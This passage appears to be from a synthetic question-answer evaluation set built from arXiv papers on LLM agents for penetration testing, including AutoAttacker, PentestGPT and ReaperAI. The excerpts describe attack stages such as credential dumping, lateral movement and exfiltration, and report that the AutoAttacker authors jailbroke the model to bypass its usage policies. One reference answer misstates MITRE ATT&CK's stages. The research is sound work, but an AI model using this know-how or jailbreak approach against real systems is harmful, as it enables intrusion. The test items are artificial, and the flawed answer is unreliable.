as\nprivilege escalation (PE), leading to severe economic loss. To detect such PEs\ndue to IAM misconfigurations, third-party cloud security services are commonly\nused. The state-of-the-art services apply whitebox penetration testing\ntechniques, which require access to complete IAM configurations. However, the\nconfigurations can contain sensitive information. To prevent the disclosure of\nsuch information, customers need to manually anonymize the configuration.\n  In this paper, we propose a precise greybox penetration testing approach\ncalled TAC for third-party services to detect IAM PEs. To mitigate the dual\nchallenges of labor-intensive anonymization and potentially sensitive\ninformation disclosures, TAC interacts with customers by selectively querying\nonly the essential information needed. Our key insight is that only a small\nfraction of information in the IAM configuration is relevant to the IAM PE\ndetection. We first propose IAM modeling, enabling TAC to detect a broad class\nof IAM PEs based on the partial information collected from queries. To improve\nthe efficiency and applicability of TAC, we aim to minimize interactions with\ncustomers by applying Reinforcement Learning (RL) with Graph Neural Networks\n(GNNs), allowing TAC to learn to make as few queries as possible. Experimental\nresults on both synthetic and real-world tasks show that, compared to\nstate-of-the-art whitebox approaches, TAC detects IAM PEs with competitively\nlow false negative rates, employing a limited number of queries.', 'entry_id': 'http://arxiv.org/abs/2304.14540v5', 'published_first_time': '2023-04-27', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.SE'], 'links': ['http://arxiv.org/abs/2304.14540v5', 'http://arxiv.org/pdf/2304.14540v5']}, {'Published': '2024-06-08', 'Title': 'Interactive Greybox Penetration Testing for Cloud Access Control using IAM Modeling and Deep Reinforcement Learning', 'Authors': 'Yang Hu, Wenxi Wang, Sarfraz Khurshid, Mohit Tiwari', 'Summary': 'Identity and Access Management (IAM) is an access control service in cloud\nplatforms. To securely manage cloud resources, customers need to configure IAM\nto specify the access control rules for their cloud organizations. However,\nincorrectly configured IAM can be exploited to cause a security attack such as\nprivilege escalation (PE), leading to severe economic loss. To detect such PEs\ndue to IAM misconfigurations, third-party cloud security services are commonly\nused. The state-of-the-art services apply whitebox penetration testing\ntechniques, which require access to complete IAM configurations. However, the\nconfigurations can contain sensitive information. To prevent the disclosure of\nsuch information, customers need to manually anonymize the configuration.\n  In this paper, we propose a precise greybox penetration testing approach\ncalled TAC for third-party services to detect IAM PEs. To mitigate the dual\nchallenges of labor-intensive anonymization and potentially sensitive\ninformation disclosures, TAC interacts with customers by selectively querying\nonly the essential information needed. Our key insight is that only a small\nfraction of information in the IAM configuration is relevant to the IAM PE\ndetection. We first propose IAM modeling, enabling TAC to detect a broad class\nof IAM PEs based on the partial information collected from queries. To improve\nthe efficiency and applicability of TAC, we aim to minimize interactions with\ncustomers by applying Reinforcement Learning (RL) with Graph Neural Networks\n(GNNs), allowing TAC to learn to make as few queries as possible. Experimental\nresults on both synthetic and real-world tasks show that, compared to\nstate-of-the-art whitebox approaches, TAC detects IAM PEs with competitively\nlow false negative rates, employing a limited number of queries.', 'entry_id': 'http://arxiv.org/abs/2304.14540v5', 'published_first_time': '2023-04-27', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.SE'], 'links': ['http://arxiv.org/abs/2304.14540v5', 'http://arxiv.org/pdf/2304.14540v5']}]",True
What are the stages of a cyberattack as delineated by the MITRE ATT&CK framework?,"['24], a state-of-the-art Large Language\nModel utilized for its expansive context understanding and dynamic response\ngeneration capabilities. This LLM serves as a central processing unit, driving the\nautonomous agents in decision-making and analytical tasks. Complementing the\nLLM, the Python wrapper plays a crucial role as the operational framework, man-\naging interactions and ensuring seamless communication among various compo-\nnents of the system. Methodologically, the project adopts a hybrid approach that\nmerges structured task trees with dynamic reprioritization capabilities, mirror-\ning real-world penetration testing frameworks while incorporating the flexibility\nof AI-driven decision processes. This blend of cutting-edge AI technology and\nmethodical security testing techniques ensures a comprehensive and adaptive\nsystem capable of addressing complex cybersecurity challenges in real-time.\n3.1\nPentesting Methodology\n3.1.1\nATT&CK Life Cycle\nThe MITRE ATT&CK framework delineates a comprehensive catalog of tac-\ntics and techniques employed by cyber adversaries throughout the stages of a\ncyberattack MITRE [2024]. The initial phase, Reconnaissance, involves the sys-\ntematic collection of data on potential targets. During this stage, attackers gather\ninformation to ascertain vulnerabilities and formulate an effective attack strat-\negy. Methods employed include social engineering, network scanning, and the\nacquisition of publicly available data, which provide a broad understanding of\nthe target’s defenses, technological infrastructure, and operational routines.\nFollowing the reconnaissance stage is Vulnerability Analysis. In this phase,\nattackers analyze the accumulated information to pinpoint weaknesses within\nthe target’s systems. The analysis typically involves the identification of secu-\nrity gaps such as outdated software components, system misconfigurations, and\n12\nFigure 3.1:\nhttps://www.mandiant.com/resources/insights/targeted-attack-\nlifecycle\ninadequate security policies. Advanced automated scanning tools may be de-\nployed to detect these vulnerabilities, providing attackers with a clearer path for\nsubsequent exploitation.\nThe final stage in the initial attack cycle is Exploitation. With vulnerabilities\nidentified and strategies formulated, attackers exploit these weaknesses using\nvarious offensive measures. This stage involves the deployment of malware, use\nof exploit kits, and other intrusion techniques aimed at breaching security mea-\nsures. The primary objective is to establish a secure foothold within the network,\nenabling further malicious activities such as data exfiltration, system compro-\nmise, or the dissemination of additional malicious payloads.\nA deep understanding of these stages is imperative for cybersecurity profes-\nsionals. It aids in the formulation of robust defensive mechanisms designed to\npreemptively detect, thwart, and mitigate the actions of cyber adversaries before\nsubstantial damage is inflicted. The complete life cycle and be seen in Figure 3.1\n3.1.2\nHack The Box\nHack The Box is an innovative online platform that provides a hands-on\ncybersecurity training environment for individuals and companies alike Hack\nThe Box [2024]. It offers a variety of real-world scenarios through virtual labs,\nwhere users can practice hacking and test their penetration testing skills in a safe\nand legal setting. The platform features a range of challenges and machines that\n13\nFigure 3.2: Main Logic Flow\nmimic different environments and security vulnerabilities, allowing users to en-\ngage in tasks ranging from simple puzzles to complex system exploits. Hack The\nBox also facilitates community interaction and learning, with forums and leader-\nboards that encourage competition and collaboration among users. This practical\napproach to learning cybersecurity is designed to sharpen problem-solving skills\nand provide real-time feedback, making it an invaluable resource for both aspir-\ning and experienced cybersecurity professionals looking to enhance their offen-\nsive security capabilities.\nHack The Box is a common test bed for implementing and refining penetra-\ntion testing methodologies. ReaperAI orchestrates tasks that mimic real penetra-\ntion test scenarios, including reconnaissance, vulnerability assessment, exploita-\ntion, and post-exploitation, all crucial elements in HTB machines. HTB provides\na structured yet adaptable platform that allows the research to be applied and\ntested, proving more advantageous than self-hosted VM setups due to ease of\nuse and setup efficiency.\n3.2\nMethodology\n3.2.1\nIntegration with LLM\nFor this research, the decision was made to employ gpt-turbo-4-preview with\na substantial context size of 128k tokens, reflecting the most sophisticated tech-\nnology available at the time of testing. The primary aim of this choice was not\nto compare various Large Language Models, but rather to explore and demon-\nstrate the advanced capabilities highlighted in existing foundational research']","The stages of a cyberattack as delineated by the MITRE ATT&CK framework include Reconnaissance, Vulnerability Analysis, and Exploitation. During Reconnaissance, attackers systematically collect data on potential targets. In the Vulnerability Analysis phase, attackers analyze the accumulated information to pinpoint weaknesses within the target’s systems. The final stage, Exploitation, involves attackers exploiting these weaknesses using various offensive measures to establish a secure foothold within the network.",simple,"[{'Published': '2024-05-09', 'Title': 'Artificial Intelligence as the New Hacker: Developing Agents for Offensive Security', 'Authors': 'Leroy Jacob Valencia', 'Summary': ""In the vast domain of cybersecurity, the transition from reactive defense to\noffensive has become critical in protecting digital infrastructures. This paper\nexplores the integration of Artificial Intelligence (AI) into offensive\ncybersecurity, particularly through the development of an autonomous AI agent,\nReaperAI, designed to simulate and execute cyberattacks. Leveraging the\ncapabilities of Large Language Models (LLMs) such as GPT-4, ReaperAI\ndemonstrates the potential to identify, exploit, and analyze security\nvulnerabilities autonomously.\n  This research outlines the core methodologies that can be utilized to\nincrease consistency and performance, including task-driven penetration testing\nframeworks, AI-driven command generation, and advanced prompting techniques.\nThe AI agent operates within a structured environment using Python, enhanced by\nRetrieval Augmented Generation (RAG) for contextual understanding and memory\nretention. ReaperAI was tested on platforms including, Hack The Box, where it\nsuccessfully exploited known vulnerabilities, demonstrating its potential\npower.\n  However, the deployment of AI in offensive security presents significant\nethical and operational challenges. The agent's development process revealed\ncomplexities in command execution, error handling, and maintaining ethical\nconstraints, highlighting areas for future enhancement.\n  This study contributes to the discussion on AI's role in cybersecurity by\nshowcasing how AI can augment offensive security strategies. It also proposes\nfuture research directions, including the refinement of AI interactions with\ncybersecurity tools, enhancement of learning mechanisms, and the discussion of\nethical guidelines for AI in offensive roles. The findings advocate for a\nunique approach to AI implementation in cybersecurity, emphasizing innovation."", 'entry_id': 'http://arxiv.org/abs/2406.07561v1', 'published_first_time': '2024-05-09', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2406.07561v1', 'http://arxiv.org/pdf/2406.07561v1']}]",True
How does GPT-3.5-turbo's extended token capacity affect its efficiency in multi-step pen testing vs. GPT-4's context management?,"['able to find all file-based vulnerabilities — the biggest improvement\nwas its round numbers: with hints, GPT-4 was typically able to ex-\nploit a vulnerability in two steps, e.g., searching for a SUID binaries,\nfollowed by exploiting one of the found ones.\nHints also allowed GPT-4 to exploit information-disclosure based\nvulnerabilities, with its exploitation rate going from 0–20% to 60–\n80%. In addition, GPT-4 was only able to solve multi-step cron-\nbased challenges when primed for that vulnerability class. Even so,\nsuccessful exploitation of that class was rare.\n5.3\nImpact of Context-Size\nEach model has a maximum token context size which depends upon\nthe respective model. Different models use different tokenizers, thus\nmaking model context sizes not directly comparable between, e.g.,\nGPT- and Llama2-based model families. For example, the amount\nof tokens generated by OpenAI’s tokenizer (used by GPT-3.5-turbo\nand GPT-4) was smaller than the amount produced by the llama\none. The tested GPT-models applied the context size limit upon\ninput data, i.e., the prompt, while Llama2-based models applies the\ncontext size limit on the sum of input and output data, i.e., prompt\nplus generated answer.\nTo make models comparable, our prototype estimates the token\ncount needed by a prompt. If the estimate exceeds the configurable\ntoken limit, either the history or the last command’s response is\ntruncated to make the resulting prompt fit the context size limit.\nWe used a context size of 4096 as an initial limit. This context\nsize should be supported by GPT-3.5-turbo, GPT-4 as well as by\nthe different Llama2 models. In addition, using a smaller context\nsize should reduce computation time and directly impact occurring\nquery costs.\nIncreasing the Context-Size. Two of our tested models support\nlarger context sizes: gpt-3.5-turbo supports up to 16k tokens, while\ngpt-4 supports up to 8k tokens. To evaluate the impact of larger con-\ntext sizes, we performed benchmark runs using those larger context\nsize limits assuming that the executed command/response history\nwill fill up the context-size over time. To allow for the context-\nsize filling up, we increased the max_rounds count from 20 to 40\nrounds. When looking at the results in Table 2, an improvement in\nboth GPT-3.5-turbo’s as well as in GPT-4’s successful exploitation\nrate can be seen. Analyzing the round number needed to achieve\nsuccessful exploitation indicates that GPT-3.5-turbo is able to stay\nwithin the original limit of 20 rounds while GPT-4 uses the full 40\nrounds. Figure 4 shows the context usage counts during different\nruns for both models, indicating that when using GPT-3.5-turbo, the\ncontext-size is filled up with the executed command’s output and\nthen truncated, while GPT-4 is not using up the additional context\nsize as only a single run exceeds the original context size of 4k.\nWhen looking at the executed commands, GPT-3.5-turbo is filling up\nthe context size with output of “broad” commands such as “ps aux”\nor rather senseless “find / -type f ” commands while GPT-4 executes\nrather targeted commands that only slowly fill up the context. We\nspeculate that the smaller GPT-3.5-turbo model benefits from the\nenlarged context-size while the larger GPT-4 model benefits from\nthe larger maximum round limit. GPT-4’s efficient use of context\nwas unexpected.\n5.4\nIn-Context Learning\nAs initial results indicated that a “working memory” context-size\nof 4k is sufficient, we were able to evaluate if adding additional\npenetration-testing information through the context improves ex-\nploitation results. To achieve this, we manually cut down Hack-\nTricks’ Linux Privilege Escalation page to content relevant to our\ntest-cases, converted it into plain-text and inserted this as back-\nground information into the next-cmd LLM prompt. We measured\nthe size of the added background information to contain 3.8k tokens,\nleaving roughly 4.2k tokens (GPT-4) or 12k tokens (GPT-3.5-turbo-\n16k) for the “main', 'ESTGPT\nto tackle the challenges identified in Exploratory Study. We\nhave experimented with different designs, and here we discuss\nsome key decisions.\n11\nAddressing Context Loss with Token Size: a straight-\nforward solution to alleviate context loss is the employment\nof LLM models with an extended token size. For instance,\nGPT-4 provides versions with 8k and 32k token size limits.\nThis approach, however, confronts two substantial challenges.\nFirst, even a 32k token size might be inadequate for penetra-\ntion testing scenarios, as the output of a single testing tool\nlike dirbuster [52] may comprise thousands of tokens. Con-\nsequently, GPT-4 with a 32k limit cannot retain the entire\ntesting context. Second, even when the entire conversation his-\ntory fits within the 32k token boundary, the API may still skew\ntowards recent content, focusing on local tasks and overlook-\ning broader context. These issues guided us in formulating\nthe design for the Reasoning Module and the Parsing Module.\nVector Database to Improve Context Length: Another\ntechnique to enhance the context length of LLMs involves\na vector database [53, 54]. By transmuting data into vector\nembeddings, LLMs can efficiently store and retrieve informa-\ntion, practically creating long-term memory. Theoretically,\npenetration testing tool outputs could be archived in the vector\ndatabase. In practice, though, we observe that many results\nclosely resemble and vary in only nuanced ways. This sim-\nilarity often leads to confused information retrieval. Solely\nrelying on a vector database fails to overcome context loss in\npenetration testing tasks. Integrating the vector database into\nthe design of PENTESTGPT is an avenue for future research.\nPrecision in Information Extraction: Precise information\nextraction is crucial for conserving token usage and avoiding\nverbosity in LLMs [55, 56]. Rule-based methods are com-\nmonly employed to extract diverse information. However,\nrule-based techniques are engineeringly expensive given nat-\nural language’s inherent complexity and the variety of infor-\nmation types in penetration testing. We devise the Parsing\nModule to manage several general input information types, a\nstrategy found to be both feasible and efficient.\nLimitations of LLMs: LLMs are not an all-encompassing\nsolution. Present LLMs exhibit flaws, including hallucina-\ntion [57,58] and outdated knowledge. Our mitigation efforts,\nsuch as implementing task tree verification to ward off hallu-\ncination, might not completely prevent the Reasoning Module\nfrom producing erroneous outcomes. Thus, a human-in-the-\nloop strategy becomes vital, facilitating the input of necessary\nexpertise and guidance to steer LLMs effectively.\n6\nEvaluation\nIn this section, we assess the performance of PENTESTGPT,\nfocusing on the following four research questions:\nRQ3 (Performance): How does the performance of PEN-\nTESTGPT compare with that of native LLM models and hu-\nman experts?\nRQ4 (Strategy): Does PENTESTGPT employ different\nproblem-solving strategies compared to those utilized by\nLLMs or human experts?\nRQ5 (Ablation): How does each module within PENTEST-\nGPT contribute to the overall penetration testing perfor-\nmance?\nRQ6 (Practicality): Is PENTESTGPT practical and effective\nin real-world penetration testing tasks?\n6.1\nEvaluation Settings\nWe implement PENTESTGPT with 1,900 lines of Python3\ncode and 740 lines of prompts, available at our anonymized\nproject website [32]. We evaluate its performance over the\nbenchmark constructed in Section 3, and additional real-world\npenetration testing machines (Section 6.5). In this evaluation,\nwe integrate PENTESTGPT with GPT-3.5 and GPT-4 to\nform two working versions: PENTESTGPT-GPT-3.5 and\nPENTESTGPT-GPT-4. Due to the lack of API access, we\ndo not select other LLM models, such as Bard. In line with\nour previous experiments, we use the same experiment envi-\nronment setting and instruct PENTESTGPT to only use the\nnon-automated penetration testing tools.\n6.2\nPerformance Evaluation (RQ3)\nThe overall task completion status of PENTESTGPT-GPT-\n3.5, PENTESTGPT-GPT-4, and the naive usage of LLMs\nis illustrated in Figure 6']","GPT-3.5-turbo benefits from the extended token capacity by filling up the context size with the output of broad commands, which allows it to stay within the original limit of 20 rounds. In contrast, GPT-4 uses the full 40 rounds and executes more targeted commands that only slowly fill up the context, indicating efficient context management. This suggests that GPT-3.5-turbo's efficiency in multi-step pen testing is enhanced by the larger context size, while GPT-4 benefits from better context management.",multi_context,"[{'Published': '2024-03-19', 'Title': 'LLMs as Hackers: Autonomous Linux Privilege Escalation Attacks', 'Authors': 'Andreas Happe, Aaron Kaplan, Jürgen Cito', 'Summary': 'Penetration testing, an essential component of software security testing,\nallows organizations to proactively identify and remediate vulnerabilities in\ntheir systems, thus bolstering their defense mechanisms against potential\ncyberattacks. One recent advancement in the realm of penetration testing is the\nutilization of Language Models (LLMs).\n  We explore the intersection of LLMs and penetration testing to gain insight\ninto their capabilities and challenges in the context of privilege escalation.\nWe create an automated Linux privilege-escalation benchmark utilizing local\nvirtual machines. We introduce an LLM-guided privilege-escalation tool designed\nfor evaluating different LLMs and prompt strategies against our benchmark.\n  Our results show that GPT-4 is well suited for detecting file-based exploits\nas it can typically solve 75-100\\% of test-cases of that vulnerability class.\nGPT-3.5-turbo was only able to solve 25-50% of those, while local models, such\nas Llama2 were not able to detect any exploits. We analyze the impact of\ndifferent prompt designs, the benefits of in-context learning, and the\nadvantages of offering high-level guidance to LLMs. We discuss challenging\nareas for LLMs, including maintaining focus during testing, coping with errors,\nand finally comparing them with both stochastic parrots as well as with human\nhackers.', 'entry_id': 'http://arxiv.org/abs/2310.11409v3', 'published_first_time': '2023-10-17', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2310.11409v3', 'http://arxiv.org/pdf/2310.11409v3']}, {'Published': '2024-06-02', 'Title': 'PentestGPT: An LLM-empowered Automatic Penetration Testing Tool', 'Authors': 'Gelei Deng, Yi Liu, Víctor Mayoral-Vilches, Peng Liu, Yuekang Li, Yuan Xu, Tianwei Zhang, Yang Liu, Martin Pinzger, Stefan Rass', 'Summary': 'Penetration testing, a crucial industrial practice for ensuring system\nsecurity, has traditionally resisted automation due to the extensive expertise\nrequired by human professionals. Large Language Models (LLMs) have shown\nsignificant advancements in various domains, and their emergent abilities\nsuggest their potential to revolutionize industries. In this research, we\nevaluate the performance of LLMs on real-world penetration testing tasks using\na robust benchmark created from test machines with platforms. Our findings\nreveal that while LLMs demonstrate proficiency in specific sub-tasks within the\npenetration testing process, such as using testing tools, interpreting outputs,\nand proposing subsequent actions, they also encounter difficulties maintaining\nan integrated understanding of the overall testing scenario.\n  In response to these insights, we introduce PentestGPT, an LLM-empowered\nautomatic penetration testing tool that leverages the abundant domain knowledge\ninherent in LLMs. PentestGPT is meticulously designed with three\nself-interacting modules, each addressing individual sub-tasks of penetration\ntesting, to mitigate the challenges related to context loss. Our evaluation\nshows that PentestGPT not only outperforms LLMs with a task-completion increase\nof 228.6\\% compared to the \\gptthree model among the benchmark targets but also\nproves effective in tackling real-world penetration testing challenges. Having\nbeen open-sourced on GitHub, PentestGPT has garnered over 4,700 stars and\nfostered active community engagement, attesting to its value and impact in both\nthe academic and industrial spheres.', 'entry_id': 'http://arxiv.org/abs/2308.06782v2', 'published_first_time': '2023-08-13', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.SE', 'categories': ['cs.SE', 'cs.CR'], 'links': ['http://arxiv.org/abs/2308.06782v2', 'http://arxiv.org/pdf/2308.06782v2']}]",True
"How does AUTOATTACKER's modular design tackle hands-on-keyboard attack automation, and how do LLMs enhance cyber attack stages?","['elligence, vol. 35, no. 5, pp. 649–663, 2023.\n[107] S. Liao, C. Zhou, Y. Zhao, Z. Zhang, C. Zhang, Y. Gao, and G. Zhong,\n“A comprehensive detection approach of nmap: Principles, rules and\nexperiments,” in 2020 international conference on cyber-enabled dis-\ntributed computing and knowledge discovery (CyberC).\nIEEE, 2020,\npp. 64–71.\n[108] A. Sarabi, T. Yin, and M. Liu, “An llm-based framework for finger-\nprinting internet-connected devices,” in Proceedings of the 2023 ACM\non Internet Measurement Conference, 2023, pp. 478–484.\n[109] M. Chen, J. Tworek, H. Jun, Q. Yuan, H. P. d. O. Pinto, J. Kaplan,\nH. Edwards, Y. Burda, N. Joseph, G. Brockman et al., “Evaluating large\nlanguage models trained on code,” arXiv preprint arXiv:2107.03374,\n2021.\n[110] S. Malik and E. Azeem, “The secrets to mimikatz-the credential\ndumper,” International Journal for Electronic Crime Investigation,\nvol. 5, no. 4, pp. 27–34, 2021.\n[111] Y. Yang, Q. Zhang, C. Li, D. S. Marta, N. Batool, and J. Folkesson,\n“Human-centric autonomous systems with llms for user command\nreasoning,” in Proceedings of the IEEE/CVF Winter Conference on\nApplications of Computer Vision, 2024, pp. 988–994.\nVIII. MOTIVATION OF AUTOMATING PENTESTING WITH\nLLMS\nWe envision a security professional tries to perform pentest-\ning against an enterprise. The goal is to infiltrate an enterprise\nnetwork and exfiltrate a sensitive document from an internal\nmachine. We select a few key attack stages following the\nMITRE ATT&CK framework [39] (“Txxxx.yyy” matches a\nTTP) and demonstrate how they can be boosted with LLMs.\nNotice that the same procedure can be followed by a real-\nworld attacker.\n• Reconnaissance. The adversary actively or passively\ngathers information about the target network, including\nthe network structure, the types of systems in use, the\nsecurity measures in place, etc. Often a large volume\nof public information needs to be processed, e.g., from\nsocial media (T1593.001), and LLMs can aid this pro-\ncess, e.g., using RAG [22] to automatically collect and\nsummarize the public data. In addition, the attacker needs\nto use scanners like nmap [107] to collect network\n(T1595.001) and software (T1592.002) information to\nidentify the vulnerabilities, and LLMs can serve as an\nagent [108] to command the scanners and analyze the\ncollected information automatically.\n• Initial Access. The attacker attempts to gain an ini-\ntial foothold within a network by attacking a vulner-\nable host/user. Often the malicious code, like drive-\nby-download code (T1189), or spearphishing email\n(T1566.001) needs to be prepared for the target, and\nLLMs can automate the generation of such content [109].\n• Credential Access and Lateral Movement. After com-\npromising a vulnerable host, if the target machine (e.g.,\nthe one containing a sensitive document) is some hops\naway, the attacker needs to identify a valid attack path\nand pivot through multiple systems/accounts. As such, the\nattacker needs to discover the credentials of the other ma-\nchines, e.g., through dumping the OS credential (T1003)\nand using the stolen password hashses to move laterally\n(T1550.002). This process requires the usage of existing\nhacking tools, like Mimikatz [110], and reasoning about\nthe execution outcomes, which are aligned with an LLM’s\ncapabilities [111].\n• Collection and Exfiltration. After reaching the target\nmachine, the attacker then needs to search for the sen-\nsitive document, e.g., from its local file system (T1005),\nand transfer the document to their machines, e.g., through\nan encrypted protocol (T1048.001). This step requires the\nexecution of APIs', ' creation of phishing websites [14], and author\nmalware [15]. Yet, these efforts only cover the very early\nstages of the attack lifecycle (or cyber kill chain [16]), and\nit is still unclear whether LLMs can facilitate the later attack\nstages, like lateral movement, in an enterprise setting. These\nsteps so far still require “hands-on-keyboard” attacks [17] from\nthe human attackers, e.g., running Linux shell or Metasploit\nshell [18] after the initial compromise, due to the complexity of\nthe victim environment, so we expect the real-world attackers\nhave strong motivations to automate them. As the capabilities\nof LLMs inevitably continue to improve, it is critical to study\nthese risks early in order to ensure that our defensive measures\nare one step ahead, in terms of both LLM model development\nand defensive security solutions.\nChallenges of attack automation with LLM. Concurrent to\nour work, there were a few recent works that aim to automate\nor aid human for penetration testing (pentesting) [19]–[21].\nBut they either require intensive human interactions [19],\nor focus on a single attack, e.g., privilege escalation [20],\n[21]. Moreover, they observe a non-negligible failure rate\neven when leveraging GPT-4 (e.g., 4 out of 10 HacktheBox\ncapture-the-flag challenges can be solved by [19]). Hence, we\nare motivated to investigate whether it is possible to fully\narXiv:2403.01038v1  [cs.CR]  2 Mar 2024\nautomate the “hands-on-keyboard” attacks, for various attack\ntechniques, under different environment setups, and at a high\nsuccess rate.\nWe start with a preliminary study to ask GPT-3.5 and GPT-\n4 to generate the attack commands, but the result is quite\nunsatisfactory, due to limitations manifested in the LLMs\nthemselves, including their usage policy constraints, the ver-\nbose responses, their limited capabilities in tracking context,\ndifficulty in discerning subtle differences in the execution\nenvironment, etc. Moreover, our problem introduces unique\nchallenges, including 1) complicated attack task chains: an\nadvanced attack might take many subtasks and even one failed\nsubtask breaks the whole chain; 2) high-density variability of\nthe action space: the commands in bash or Metasploit have\nmany parameters and some of them are closely connected to\nsystem information or the folder path, of which one typo could\nbreak the attack command.\nOur solution. To address the aforementioned challenges and\nmaximize the potential of LLMs in attack automation, we\nimplemented a new system called AUTOATTACKER. Our main\ninsights are two-fold. 1) Instead of building a monolithic agent\nto follow the standard prompt-response interactions to obtain\nthe attack commands, we propose a modular agent design,\nto leverage different capabilities of LLMs, e.g., planning,\nsummarizing, and code generation, at different points, even\nwhen generating a single attack command. With this design,\nwe can better harness LLMs to produce precise answers. 2)\nWe borrow the idea from Retrieval Augmented Generation\n(RAG) [22] to augment LLMs with a knowledge base of the\nprevious attack actions (called experiences) before generating\nthe next action, so the chances of successful attacks are\nincreased because their composing subtasks can be reused.\nIn light of these insights, we design 4 modules, namely\nsummarizer, planner, navigator and experience manager, to\ninteract with LLMs iteratively. We also carefully design the\nprompt templates for each module, so a LLM’s response is\nhighly controllable. To bypass the usage policies, we develop\nan LLM jailbreaking technique to elicit the attack commands.\nSummary of experiment results.\nWe found the previous\nbenchmarks about LLM-based pentesting [23], [24] either\ncover a few attacks or lack detailed attack/environment spec-\nifications. As such, we develop a new benchmark with 14\ndifferent attacks, covering most of the attack stages including\nreconnaissance, initial access, execution, persistence, privilege\nescalation, etc. Our simulation environment consists of multi-\nple virtual machines (VMs) running in a Hyper-V hypervisor,\nwith different OSes (Windows and Linux) and software (e.g.,\nDomain Controller and WinRAR). The attacker VM has\ninstalled the popular open-source framework Metasploit to ex-\namine how AUTOATTACKER utilizes the attack tools. We also\ncarefully enforce security policies to']","AUTOATTACKER's modular design tackles hands-on-keyboard attack automation by implementing a system with four modules: summarizer, planner, navigator, and experience manager. These modules interact with LLMs iteratively, leveraging different capabilities of LLMs such as planning, summarizing, and code generation at different points to produce precise answers. Additionally, the system uses Retrieval Augmented Generation (RAG) to augment LLMs with a knowledge base of previous attack actions, increasing the chances of successful attacks by reusing composing subtasks. LLMs enhance cyber attack stages by aiding in reconnaissance through automatic data collection and summarization, generating malicious content for initial access, reasoning about execution outcomes for credential access and lateral movement, and executing APIs for collection and exfiltration.",multi_context,"[{'Published': '2024-03-02', 'Title': 'AutoAttacker: A Large Language Model Guided System to Implement Automatic Cyber-attacks', 'Authors': 'Jiacen Xu, Jack W. Stokes, Geoff McDonald, Xuesong Bai, David Marshall, Siyue Wang, Adith Swaminathan, Zhou Li', 'Summary': 'Large language models (LLMs) have demonstrated impressive results on natural\nlanguage tasks, and security researchers are beginning to employ them in both\noffensive and defensive systems. In cyber-security, there have been multiple\nresearch efforts that utilize LLMs focusing on the pre-breach stage of attacks\nlike phishing and malware generation. However, so far there lacks a\ncomprehensive study regarding whether LLM-based systems can be leveraged to\nsimulate the post-breach stage of attacks that are typically human-operated, or\n""hands-on-keyboard"" attacks, under various attack techniques and environments.\n  As LLMs inevitably advance, they may be able to automate both the pre- and\npost-breach attack stages. This shift may transform organizational attacks from\nrare, expert-led events to frequent, automated operations requiring no\nexpertise and executed at automation speed and scale. This risks fundamentally\nchanging global computer security and correspondingly causing substantial\neconomic impacts, and a goal of this work is to better understand these risks\nnow so we can better prepare for these inevitable ever-more-capable LLMs on the\nhorizon. On the immediate impact side, this research serves three purposes.\nFirst, an automated LLM-based, post-breach exploitation framework can help\nanalysts quickly test and continually improve their organization\'s network\nsecurity posture against previously unseen attacks. Second, an LLM-based\npenetration test system can extend the effectiveness of red teams with a\nlimited number of human analysts. Finally, this research can help defensive\nsystems and teams learn to detect novel attack behaviors preemptively before\ntheir use in the wild....', 'entry_id': 'http://arxiv.org/abs/2403.01038v1', 'published_first_time': '2024-03-02', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2403.01038v1', 'http://arxiv.org/pdf/2403.01038v1']}, {'Published': '2024-03-02', 'Title': 'AutoAttacker: A Large Language Model Guided System to Implement Automatic Cyber-attacks', 'Authors': 'Jiacen Xu, Jack W. Stokes, Geoff McDonald, Xuesong Bai, David Marshall, Siyue Wang, Adith Swaminathan, Zhou Li', 'Summary': 'Large language models (LLMs) have demonstrated impressive results on natural\nlanguage tasks, and security researchers are beginning to employ them in both\noffensive and defensive systems. In cyber-security, there have been multiple\nresearch efforts that utilize LLMs focusing on the pre-breach stage of attacks\nlike phishing and malware generation. However, so far there lacks a\ncomprehensive study regarding whether LLM-based systems can be leveraged to\nsimulate the post-breach stage of attacks that are typically human-operated, or\n""hands-on-keyboard"" attacks, under various attack techniques and environments.\n  As LLMs inevitably advance, they may be able to automate both the pre- and\npost-breach attack stages. This shift may transform organizational attacks from\nrare, expert-led events to frequent, automated operations requiring no\nexpertise and executed at automation speed and scale. This risks fundamentally\nchanging global computer security and correspondingly causing substantial\neconomic impacts, and a goal of this work is to better understand these risks\nnow so we can better prepare for these inevitable ever-more-capable LLMs on the\nhorizon. On the immediate impact side, this research serves three purposes.\nFirst, an automated LLM-based, post-breach exploitation framework can help\nanalysts quickly test and continually improve their organization\'s network\nsecurity posture against previously unseen attacks. Second, an LLM-based\npenetration test system can extend the effectiveness of red teams with a\nlimited number of human analysts. Finally, this research can help defensive\nsystems and teams learn to detect novel attack behaviors preemptively before\ntheir use in the wild....', 'entry_id': 'http://arxiv.org/abs/2403.01038v1', 'published_first_time': '2024-03-02', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2403.01038v1', 'http://arxiv.org/pdf/2403.01038v1']}]",True
